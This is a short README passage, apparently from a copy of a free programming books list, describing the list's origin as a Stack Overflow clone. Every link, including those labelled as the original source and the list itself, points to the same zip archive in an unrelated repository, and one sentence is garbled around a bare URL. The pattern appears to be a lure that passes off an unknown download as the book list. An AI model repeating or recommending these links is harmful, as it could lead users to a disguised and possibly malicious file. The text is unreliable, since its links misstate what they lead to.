======================

This list initially was a clone of [stackoverflow - List of freely available programming books](https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip) by George Stocker. Now updated, with dead links gone (hopefully) and new content.
Moved to GitHub for collaborative updating and for the purpose of https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip : [List of free programming books](https://raw.githubusercontent.com/videogramme/free-programming-books/master/unaccommodatingly/books-free-programming-v1.5.zip).
